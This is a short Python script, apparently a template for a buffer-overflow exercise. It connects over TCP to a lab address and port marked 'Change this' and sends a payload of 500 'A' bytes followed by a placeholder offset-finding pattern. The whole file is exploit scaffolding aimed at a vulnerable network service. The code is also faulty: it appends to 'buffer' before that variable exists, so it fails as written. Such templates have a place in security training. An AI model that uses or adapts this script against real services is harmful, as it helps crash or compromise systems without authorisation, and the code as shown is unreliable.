import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

prefix = b''
buffer += b'A' * 500
buffer += b'unique_string_goes_here'

payload = prefix + buffer

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
